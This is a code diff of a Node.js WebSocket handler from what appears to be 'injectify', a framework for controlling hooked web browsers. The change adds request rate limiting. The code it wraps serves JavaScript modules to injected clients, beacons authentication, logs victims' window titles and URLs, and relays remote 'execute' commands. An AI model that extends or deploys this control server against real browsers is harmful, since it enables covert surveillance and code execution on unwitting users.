@@ -1,11 +1,12 @@
 /* eslint-disable prefer-promise-reject-errors */
 const atob = require('atob')
 const chalk = require('chalk')
-const config = require('../../server.config.js')
+const config = require('../../server.config.js').injectify
 const geoip = require('geoip-lite')
 const {flag} = require('country-emoji')
 const parseAgent = require('user-agent-parser')
 const twemoji = require('twemoji')
+const RateLimiter = require('limiter').RateLimiter
 const getIP = require('../modules/getIP.js')
 
 module.exports = (db, inject, socket) => {
@@ -67,6 +68,11 @@ module.exports = (db, inject, socket) => {
     send('auth', `var server=ws.url.split("/"),protocol="https://";"ws:"===server[0]&&(protocol="http://"),server=protocol+server[2];var auth=new Image;auth.src=server+"/a?id=${encodeURIComponent(socket.id)}&z=${+new Date()}";auth.onload`)
     inject.authenticate[socket.id] = (token, authReq) => {
       let { debug, project } = data
+      /**
+       * Rate limit responses to prevent DDoS
+       */
+      let limiter = new RateLimiter(100, 'second', true)
+
       /**
        * Create an object for the project's client
        */
@@ -287,118 +293,124 @@ module.exports = (db, inject, socket) => {
       }
 
       socket.on('data', rawData => {
-        try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
-        let on = (topic, callback) => {
-          if (topic !== rawData.t) return
-          callback(rawData.d)
-        }
+        limiter.removeTokens(1, (err, remainingRequests) => {
+          if (err || remainingRequests < 1) {
+            send('error', 'Too many requests! slow down')
+            return
+          }
+          try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
+          let on = (topic, callback) => {
+            if (topic !== rawData.t) return
+            callback(rawData.d)
+          }
 
-        /**
-         * Module loader
-         */
-        on('module', data => {
-          try {
-            if (!data.name) return
-            let js = inject.modules[data.name]
-            if (debug) js = inject.debugModules[data.name]
-            if (js) {
-              try {
-                js = `${typeof data.token === 'number' ? `module.token=${data.token};` : ``}${data.params ? `module.params=${JSON.stringify(data.params)};` : ``}module.return=function(d){this.returned=d};${js}`
-                send('module', {
-                  name: data.name,
-                  token: data.token,
-                  script: js
-                })
-              } catch (error) {
+          /**
+           * Module loader
+           */
+          on('module', data => {
+            try {
+              if (!data.name) return
+              let js = inject.modules[data.name]
+              if (debug) js = inject.debugModules[data.name]
+              if (js) {
+                try {
+                  js = `${typeof data.token === 'number' ? `module.token=${data.token};` : ``}${data.params ? `module.params=${JSON.stringify(data.params)};` : ``}module.return=function(d){this.returned=d};${js}`
+                  send('module', {
+                    name: data.name,
+                    token: data.token,
+                    script: js
+                  })
+                } catch (error) {
+                  send('module', {
+                    name: data.name,
+                    token: data.token,
+                    error: {
+                      code: 'server-error',
+                      message: `Encountered a server-side error whilst loading module "${data.name}"`
+                    }
+                  })
+                }
+              } else {
                 send('module', {
                   name: data.name,
                   token: data.token,
                   error: {
-                    code: 'server-error',
-                    message: `Encountered a server-side error whilst loading module "${data.name}"`
+                    code: 'not-installed',
+                    message: `Module "${data.name}" not installed on server`
                   }
                 })
               }
-            } else {
-              send('module', {
-                name: data.name,
-                token: data.token,
-                error: {
-                  code: 'not-installed',
-                  message: `Module "${data.name}" not installed on server`
+            } catch (error) {
+              console.error(
+                chalk.redBright('[inject] ') +
+                chalk.yellowBright(error)
+              )
+            }
+          })
+
+          /**
+           * Client info logger
+           */
+          on('i', data => {
+            /**
+             * Max string length
+             */
+            let maxStringLength = 100
+            let maxUrlLength = 2083
+            /**
+             * Safely parse data
+             */
+            if (typeof data === 'object') {
+              if (typeof data.window === 'object') {
+                let { title, url, active } = data.window
+                if (typeof title === 'string') {
+                  session.window.title = title.substring(0, maxStringLength)
                 }
-              })
-            }
-          } catch (error) {
-            console.error(
-              chalk.redBright('[inject] ') +
-              chalk.yellowBright(error)
-            )
-          }
-        })
-
-        /**
-         * Client info logger
-         */
-        on('i', data => {
-          /**
-           * Max string length
-           */
-          let maxStringLength = 100
-          let maxUrlLength = 2083
-          /**
-           * Safely parse data
-           */
-          if (typeof data === 'object') {
-            if (typeof data.window === 'object') {
-              let { title, url, active } = data.window
-              if (typeof title === 'string') {
-                session.window.title = title.substring(0, maxStringLength)
-              }
-              if (typeof url === 'string') {
-                session.window.url = url.substring(0, maxUrlLength)
-              }
-              if (typeof active === 'boolean') {
-                session.window.active = active
+                if (typeof url === 'string') {
+                  session.window.url = url.substring(0, maxUrlLength)
+                }
+                if (typeof active === 'boolean') {
+                  session.window.active = active
+                }
               }
             }
-          }
-        })
+          })
 
-        /**
-         * Data logger
-         */
-        on('l', data => {
-          console.log(data)
-        })
+          /**
+           * Data logger
+           */
+          on('l', data => {
+            console.log(data)
+          })
 
-        /**
-         * Error logger
-         */
-        on('e', data => {
-          send('error', data)
-          console.log(data)
-        })
+          /**
+           * Error logger
+           */
+          on('e', data => {
+            send('error', data)
+            console.log(data)
+          })
 
-        /**
-         * Get server ping time
-         */
-        on('ping', pingTime => {
-          send('pong', pingTime)
-        })
+          /**
+           * Get server ping time
+           */
+          on('ping', pingTime => {
+            send('pong', pingTime)
+          })
 
-        /**
-         * Get server ping time
-         */
-        on('heartbeat', data => {
-          send('stay-alive')
-        })
+          /**
+           * Get server ping time
+           */
+          on('heartbeat', data => {
+            send('stay-alive')
+          })
 
-        /**
-         * For testing execute's from the client side
-         */
-        on('execute', data => {
-          send('execute', data)
+          /**
+           * For testing execute's from the client side
+           */
+          on('execute', data => {
+            send('execute', data)
+          })
         })
       })
 
